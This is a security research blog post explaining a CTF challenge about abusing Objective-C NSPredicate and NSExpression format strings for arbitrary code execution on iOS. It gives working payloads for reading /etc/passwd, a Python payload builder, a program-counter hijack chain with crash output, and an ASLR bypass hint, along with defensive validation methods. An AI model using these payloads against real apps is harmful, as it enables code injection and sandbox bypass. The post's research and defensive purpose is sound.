---
layout: post
title: "See No Eval: Runtime Dynamic Code Execution in Objective-C"
date: 2021-01-16
image: /img/2021-01-16-see-no-eval-runtime/headline.png
---

I designed the challenge [Dezhou Instrumentz](https://github.com/ChiChou/DezhouInstrumenz/) for [RealWorldCTF](https://realworldctf.com/). For further explaination I gave a talk regarding the motivation and expected solution for it:

* [Slides](https://speakerdeck.com/chichou/see-no-eval-runtime-dynamic-code-execution-in-objective-c)

<iframe src="https://www.youtube.com/embed/dvvFWa3Nm2M" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

The challenge is about abusing runtime feature of Objective-C to execute arbitrary unsigned code on iOS (even with PAC). This is surprising because dynamically parsing and executing code (eval) is usually seen in script interpreters, not for a compiled language like Objective-C. I didn't have too much time preparing that talk so I'm about to add more detail on the chapters it didn't cover.

## NSPredicate and NSExpression

They are both from the Foundation framework, well-documented as below.

* <https://developer.apple.com/documentation/foundation/nspredicate>
* <https://developer.apple.com/documentation/foundation/nsexpression>

Both of them accept a format string to compile to an abstract synatx tree. This is done by the function `_qfqp2_performParsing` from `Foundation.framework`.

Here is an example:

> name == 'Apple'

It's gonna be translated to the following abstract syntax tree. The execution is directly on this tree, no byte code or just-in-time compilation involved.

<p class="full"><img src="/img/2021-01-16-see-no-eval-runtime/nspredicate-ast.svg" alt="Abstract Syntax Tree"></p>

NSExpression can be an operand of another `NSPredicate` instance, or used independently. In fact, the initializer of `NSExpression` simply creates a new `NSPredicate` and returns one of the operand.

```objc
NSExpression *__cdecl +[NSExpression expressionWithFormat:argumentArray:](id a1, SEL a2, id a3, id a4)
{
  NSString *v5; // x0
  NSPredicate *v6; // x0

  v5 = +[NSString stringWithFormat:](&OBJC_CLASS___NSString, sel_stringWithFormat_, CFSTR("%@ == 1"), a3);
  v6 = +[NSPredicate predicateWithFormat:argumentArray:](
         &OBJC_CLASS___NSPredicate,
         sel_predicateWithFormat_argumentArray_,
         v5,
         a4);
  return (NSExpression *)objc_msgSend_0(v6, sel_leftExpression);
}
```

It supports compound mathematical expressions, so we can use `NSExpression` to create a calculator. All of those arithmetic operators are going to be translated to invocations on a private class `_NSPredicateUtilities`.

[Foundation.framework/_NSPredicateUtilities.h](https://github.com/nst/iOS-Runtime-Headers/blob/master/Frameworks/Foundation.framework/_NSPredicateUtilities.h)

```objc
@interface _NSPredicateUtilities : NSObject
+ (id)abs:(id)arg1;
+ (id)add:(id)arg1 to:(id)arg2;
+ (id)average:(id)arg1;
+ (id)bitwiseAnd:(id)arg1 with:(id)arg2;
+ (id)bitwiseOr:(id)arg1 with:(id)arg2;
+ (id)bitwiseXor:(id)arg1 with:(id)arg2;
+ (id)castObject:(id)arg1 toType:(id)arg2;
+ (id)ceiling:(id)arg1;
+ (id)count:(id)arg1;
+ (id)distanceToLocation:(id)arg1 fromLocation:(id)arg2;
+ (id)distinct:(id)arg1;
+ (id)divide:(id)arg1 by:(id)arg2;
+ (id)exp:(id)arg1;
//...
@end
```

Furthermore, we can extend the operators by dynamically adding methods to this class, just like what I did in the challenge:

[DezhouInstrumenz/DezhouInstrumenz/Math.swift.gyb](https://github.com/ChiChou/DezhouInstrumenz/blob/master/DezhouInstrumenz/Math.swift.gyb)

## Arbitrary Code Execution

Besides the [common usage](https://nshipster.com/nspredicate/), there are also special operators that allows arbitrary runtime invocation.

It's clearly documented in the [official documentation of NSExpression](https://developer.apple.com/documentation/foundation/nsexpression?language=objc#1651258) that it supports Function Expresion, that allows performing arbitrary selector.

> **Function Expressions**
>
> In OS X v10.4, NSExpression only supports a predefined set of functions: sum, count, min, max, and average. These predefined functions were accessed in the predicate syntax using custom keywords (for example, `MAX(1, 5, 10)`).
>
> In macOS 10.5 and later, function expressions also support arbitrary method invocations. To use this extended functionality, you can now use the syntax `FUNCTION(receiver, selectorName, arguments, ...)`, for example:
>
> `FUNCTION(@"/Developer/Tools/otest", @"lastPathComponent") => @"otest"`

So this is a `[obj performSelector:NSSelectorFromString(str)]` equivalent.

Generally we can use string and number literals in the expression, which will be translated to `NSString` and `NSNumber` respectively. There is a `CAST` operator that allows converting datatypes with lossy string representations, for example, `CAST(####, "NSDate")`. It doesn't mention that when the second parameter is `Class`, this equals `NSClassFromString`.

With arbitrary class lookup and arbitrary selector invocation, we now have full Objective-C runtime access.

For example, this line of code reads out the content of `/etc/passwd`

```js
FUNCTION(FUNCTION(FUNCTION('A', 'superclass'), 'alloc'), 'initWithContentsOfFile:', '/etc/passwd')
```

Here is a python script for converting payloads to expression format:

```python
def stringify(o):
    if isinstance(o, str):
        return '"%s"' % o

    if isinstance(o, list):
        return '{' + ','.join(map(stringify, o)) + '}'

    return str(o)


class Call:
    def __init__(self, target, sel, *args):
        self.target = target
        self.sel = sel
        self.args = args

    def __str__(self):
        if len(self.args):
            joint = ','.join(map(stringify, self.args))
            tail = ',' + joint
        else:
            tail = ''
        return f'FUNCTION({stringify(self.target)},"{self.sel}"{tail})'


class Clazz:
    def __init__(self, name):
        self.name = name

    def __str__(self):
        return f'CAST("{self.name}","Class")'
```

This is ~~very close to~~ even better than the [SeLector-Oriented Programming by Project Zero](https://bugs.chromium.org/p/project-zero/issues/detail?id=1933). It's just like the `eval()` function of Objective-C. PAC doesn't stop this sort of execution at all.

If you prefer classic ROP, here is a method for PC-control, `-[NSInvocation invokeUsingIMP:]`. A problem for this method is that it won't do anything when the `target` property is `nil`. There is no way for both setting initializing the property and then reuse the reference to call its method, because predicates don't support lines and variables (at this moment).

Luckily I found this gadget `-[NSInvocationOperation initWithTarget:selector:object:]` that can initialize the property and return the reference in a chaining call favor.

```objc
NSInvocationOperation *__cdecl -[NSInvocationOperation initWithTarget:selector:object:](NSInvocationOperation *self, SEL a2, id a3, SEL a4, id a5)
{
  v19 = a5;
  v9 = objc_msgSend_0(a3, sel_methodSignatureForSelector_, a4);
  v10 = v9;
  v11 = (unsigned __int64)objc_msgSend_0(v9, sel_numberOfArguments);
  v12 = v11;
  v13 = +[NSInvocation invocationWithMethodSignature:](
          &OBJC_CLASS___NSInvocation,
          sel_invocationWithMethodSignature_,
          v10);
  -[NSInvocation setTarget:](v13, sel_setTarget_, a3);
  -[NSInvocation setSelector:](v13, sel_setSelector_, a4);
  if ( v12 >= 3 )
    -[NSInvocation setArgument:atIndex:](v13, sel_setArgument_atIndex_, &v19, 2LL);
  return (NSInvocationOperation *)-[NSInvocationOperation initWithInvocation:](self, sel_initWithInvocation_, v13);
}
```

So the payload for PC-control looks like this:

```python
def selector(name):
    expr = Call(Clazz('NSFunctionExpression'), 'alloc')
    expr = Call(expr, 'initWithTarget:selectorName:arguments:', '', name, [])
    return Call(expr, 'selector')

def pc_control(pc=0x41414141):
    NSString = Clazz('NSString')
    op = Call(Clazz('NSInvocationOperation'), 'alloc')
    op = Call(op, 'initWithTarget:selector:object:',
    NSString, selector('alloc'), [])
    invocation = Call(op, 'invocation')
    imp = Call(pc, 'intValue')
    return Call(invocation, 'invokeUsingIMP:', imp) 
```

```js
FUNCTION(FUNCTION(FUNCTION(FUNCTION(CAST('NSInvocationOperation','Class'),'alloc'),'initWithTarget:selector:object:',CAST('NSString','Class'),FUNCTION(FUNCTION(FUNCTION(CAST('NSFunctionExpression','Class'),'alloc'),'initWithTarget:selectorName:arguments:','','alloc',{}),'selector'),{}),'invocation'),'invokeUsingIMP:',FUNCTION(0x41414141,'intValue'))
```

```
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x41414141)
    frame #0: 0x0000000041414141
    frame #1: 0x00007fff2042556c CoreFoundation`__invoking___ + 140
    frame #2: 0x00007fff204cff1e CoreFoundation`-[NSInvocation invokeUsingIMP:] + 225
    frame #3: 0x00007fff211d676b Foundation`-[NSFunctionExpression expressionValueWithObject:context:] + 721
```

You can defeat ASLR by leveraging `-[CNFileServices dlsym::]` or `-[ABFileServices dlsym::]`. If those classes are not avaliable, use `NSBundle` to load their modules first.

## Writing An Interpreter

Both `NSExpresson` and `NSPredicate` acts as an interpreter that exposes runtime reflection interfaces to a dynamic string (scripting). There are several frameworks that have similar design, but for different purposes:

* [react-native](https://reactnative.dev/) for hybrid app development
* [JSPatch](https://jspatch.com/) for hot patch

Dynamically loading remote script to execute native methods is considered voilating AppStore review guide.

> This includes any code which passes arbitrary parameters to dynamic methods such as `dlopen()`, `dlsym()`, `respondsToSelector:`, `performSelector:`, `method_exchangeImplementations()`, and running remote scripts in order to change app behavior or call SPI, based on the contents of the downloaded script. Even if the remote resource is not intentionally malicious, it could easily be hijacked via a Man In The Middle (MiTM) attack, which can pose a serious security vulnerability to users of your app.

[Message from Apple Review... - Apple Developer Forums](https://developer.apple.com/forums/thread/73640)

Compared to known dyanmic execution frameworks, `NSExpression` and `NSPredicate` are totally legitimate. You don't have to introduce suspecious symbols like `NSSelectorFromString`, the runtime does the job for you. The code pattern is hard to spot. It looks like you're just filtering an array with a dynamic predicate. Innocent, isn't it?

Though we've got access to Objective-C runtime, there are some limitations for the expression that makes it hard to program the payload.

* It's only an expression, so an one-liner at a time
* No control flow. However, we can use compound logic operators to partially implement it
* No local variables. There is a workaround.
* Still powerful to do plenty of things.

Because of those limitations, we can't initialize an object and call its different methods multiple times, unless the API is designed to be chaining calls. For example, it's impossible to call the following methods one by one.

```objc
ClassA *a = [[ClassA alloc] init];
[a setX:x];
[a submit];
```

Fore local variables, there is [Assignment Expression](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/Predicates/Articles/pBNF.html#//apple_ref/doc/uid/TP40001796-217886). The syntax looks like this:

```
assignment_expression ::= predicate_variable ":=" expression
```

It's only avaliable when the `context` argument of the method `-[NSExpression expressionValueWithObject:context:]` is a valid `NSMutableDictionary`, then the evaluation result writes a key-value pair back to this mutable dictionary. Just reuse the same context in a loop, we can have a script interpreter that supports variables.

```objc
#import <Foundation/Foundation.h>

int main(int argc, char *argv[]) {
  if (argc != 2) {
    printf("usage: %s script\n", argv[0]);
    exit(1);
  }

  @autoreleasepool {
    NSString *path = [NSString stringWithUTF8String:argv[1]];
    NSString *content = [NSString stringWithContentsOfFile:path
                                                  encoding:NSUTF8StringEncoding
                                                     error:nil];
    NSArray *lines = [content componentsSeparatedByString:@"\n"];
    NSMutableDictionary *context = [NSMutableDictionary dictionary];
    NSObject *value = nil;

    for (NSString *line in lines) {
      NSExpression *expr = [NSExpression expressionWithFormat:line];
      value = [expr expressionValueWithObject:nil context:context];
    }

    puts(value.description.UTF8String);
  }

  return 0;
}

```

A sample script that concats two strings:

```js
$content := FUNCTION(FUNCTION(FUNCTION('A', 'superclass'), 'alloc'), 'initWithContentsOfFile:', '/etc/nanorc')
$tmp := FUNCTION(FUNCTION(CAST('NSProcessInfo', 'Class'), 'processInfo'), 'environment').TMPDIR
FUNCTION($tmp, 'stringByAppendingString:', $content)
```

## Potential Attack Surfaces

We knew that it's better to use parameter binding to avoid SQL injection. There is parameter binding for predicates, too.

There is a family of methods for creating predicate out of a string.

* +[NSPredicate predicateWithFormat:]
* +[NSPredicate predicateWithFormat:argumentArray:]
* +[NSPredicate predicateWithFormat:arguments:]
* +[NSExpression expressionWithFormat:]
* +[NSExpression expressionWithFormat:argumentArray:]
* +[NSExpression expressionWithFormat:arguments:]

For those methods that accepts `arguments` or `argumentArray`, they are safe to use because they work just like parameter binding. But if you create a dynamic string from user input and feed it to the format string, it's going to be both a format string vulnerability and a code injection. At the time of writing this article, Xcode doesn't consider them format string bugs and no warning is generated.

So how does Apple itself prevent the code injection?

### Serialization

Both `NSPredicate` and `NSExpression` are `NSSecureCoding` serializable.

```
Foundation:__text:00000001808AC298 ; bool __cdecl +[NSExpression supportsSecureCoding](id, SEL)
Foundation:__text:00000001808AC298                 MOV             W0, #1
Foundation:__text:00000001808AC29C                 RET
```

Only keyed-coding is allowed. Besides, there is a flag that determines whether the expression is executable.

```c
NSPredicate *__cdecl -[NSPredicate initWithCoder:](NSPredicate *self, SEL a2, id a3)
{
  NSPredicate *v5; // x20
  NSPredicate *result; // x0
  NSException *v7; // x0
  id v8; // x0
  SEL v9; // x1
  _NSProgressFractionTuple *v10; // x2

  if ( ((unsigned int)objc_msgSend_0(a3, sel_allowsKeyedCoding) & 1) != 0 )
  {
    v5 = -[NSObject init](self, sel_init);
    if ( v5 )
    {
      if ( (unsigned int)objc_msgSend_0(a3, sel_requiresSecureCoding) )
        *(_DWORD *)&v5->_predicateFlags |= 1u;
    }
    result = v5;
  }
  else
  {
    objc_release_0(self);
    v7 = +[NSException exceptionWithName:reason:userInfo:](
           &OBJC_CLASS___NSException,
           sel_exceptionWithName_reason_userInfo_,
           CFSTR("NSInvalidArgumentException"),
           CFSTR("NSPredicates and NSExpressions cannot be decoded by non-keyed archivers"),
           0LL);
    objc_exception_throw(v7);
    -[NSProgress _updateFractionCompleted:](v8, v9, v10);
  }
  return result;
}
```

If the decoder class confirms to NSSecureCoding, the executable flag will be disabled:

```c
bool __cdecl -[NSPredicate _allowsEvaluation](NSPredicate *self, SEL a2)
{
  return (*(_BYTE *)&self->_predicateFlags & 1) == 0;
}
```

The caller must explicitly calls `-[NSPredicate allowsEvaluation]` before using it.

```
void __cdecl -[NSPredicate allowEvaluation](NSPredicate *self, SEL a2)
{
  *(_DWORD *)&self->_predicateFlags &= 0xFFFFFFFE;
}
```

### Sanitization

The abstract syntax tree is created once the predicate is compiled. We can always manually check the type of each nodes and write visitors on your own like this:

```c
__int64 __fastcall NSExtensionIsPredicateSafeToExecuteWithObject(__int64 a1, __int64 a2)
{
  Class v4; // x0
  __int64 v5; // x20

  v4 = objc_getClass_0("NSTruePredicate");
  if ( (objc_opt_isKindOfClass_0(a1, v4) & 1) != 0 )
    CFLog(4LL, CFSTR("Use of NSTruePredicate is forbidden: %@"));
  v5 = _NSExtensionIsSafePredicateForObjectWithSubquerySubstitutions(a1, a2, &__NSDictionary0__struct);
  if ( (v5 & 1) == 0 )
    CFLog(4LL, CFSTR("%s: NSPredicate considered unsafe: %@"));
  return v5;
}
```

The snippet above is from Foundation to validate the predicate field of App Extensions.

[App Extension Programming Guide: Handling Common Scenarios](https://developer.apple.com/library/archive/documentation/General/Conceptual/ExtensibilityPG/ExtensionScenarios.html)

> The keys in the `NSExtensionActivationRule` dictionary are sufficient to meet the filtering needs of typical app extensions. If you need to do more complex or more specific filtering, such as distinguishing between public.url and public.image, you can create a predicate statement. Then, use the bare string that represents the predicate as the value of the NSExtensionActivationRule key. (At runtime, the system compiles this string into an `NSPredicate` object.)

Besides, there is an undocumented protocol for visiting the AST:

```objc
@protocol NSPredicateVisitor

-(void)visitPredicate:(id)arg1;
-(void)visitPredicateExpression:(id)arg1;
-(void)visitPredicateOperator:(id)arg1;
@end
```

We can create a delegate to visit all the nodes to check whether the operations are safe. These methods are from dyld_shared_cache:

```
UIKitCore:__objc_const:00000001BF0C9158	              -[_UITargetContentIdentifierPredicateValidator visitPredicateExpression:]
CoreData:__objc_const:00000001BF3695E8	              -[_NSMemoryStorePredicateRemapper visitPredicateExpression:]
CoreData:__objc_const:00000001BF369750	              -[_NSChildContextPredicateRemapper visitPredicateExpression:]
CoreData:__objc_const:00000001BF3698C0	              -[_NSPersistentHistoryPredicateRemapper visitPredicateExpression:]
CoreData:__objc_const:00000001BF369A90	              -[_NSXPCStorePredicateRemapper visitPredicateExpression:]
CoreData:__objc_const:00000001BF3962B0	              -[NSSQLPredicateAnalyser visitPredicateExpression:]
CoreData:__objc_const:00000001BF3993C8	              -[NSSQLSubqueryExpressionIntermediatePredicateVisitor visitPredicateExpression:]
CoreData:__objc_const:00000001BF3B7568	              -[NSSQLFetchRequestContext visitPredicateExpression:]
Contacts:__objc_const:00000001BFA4D3D0	              -[CNPredicateValidator visitPredicateExpression:]
Photos:__objc_const:00000001C025D7D8	                -[PHQuery visitPredicateExpression:]
AppPredictionClient:__objc_const:00000001C20C5388	    -[ATXActionCriteriaPredicateChecker visitPredicateExpression:]
LoggingSupport:__objc_const:00000001C2B1D760          -[_OSLogPredicateMapper visitPredicateExpression:]
LoggingSupport:__objc_const:00000001C2B1EE80          -[_OSLogCatalogFilter visitPredicateExpression:]
LoggingSupport:__objc_const:00000001C2B202E8          -[_OSLogSimplePredicate visitPredicateExpression:]
LoggingSupport:__objc_const:00000001C2B204B0          -[_OSLogStreamFilter visitPredicateExpression:]
libcoreroutine:__objc_const:00000001C4783800          -[RTPredicateValidator visitPredicateExpression:]
libcoreroutine:__objc_const:00000001C4796468          -[RTPredicateInspector visitPredicateExpression:]
```

For example. `PHQuery` is associated to `PHFetchOptions` class when reading from photos. Without a proper validation, it could be an inter-process attack surface to bypass TCC. I've seen similar validations in a developer disk image daemon, a possible persistence vector that doesn't require rootfs remount (I need to remind you again, this execution technique works on PAC), the `log` command of macOS that is able to get arbitrary task ports.

~~So I guess it's hard to find real cases in Apple's own code because they handled it so carefully.~~

## Follow-ups

#### Updated on Apr 2022

Seems like this post inspired some exploit technique in the wild: [FORCEDENTRY: Sandbox Escape](https://googleprojectzero.blogspot.com/2022/03/forcedentry-sandbox-escape.html)

#### Updated on Oct 2023

[An analysis of an in-the-wild iOS Safari WebContent to GPU Process exploit](https://googleprojectzero.blogspot.com/2023/10/an-analysis-of-an-in-the-wild-ios-safari-sandbox-escape.html)

<p style="text-align: center"><img src="https://i.imgur.com/TxkzN48.jpeg" width="240" class="meme" /></p>

#### Updated on Jan 2024

Another round. Part of Operation Triangulation's attack chain.

![attack chain](/img/2021-01-16-see-no-eval-runtime/trng_final_mystery_en_01.png)

[Operation Triangulation’ attack chain](https://securelist.com/operation-triangulation-the-last-hardware-mystery/111669/)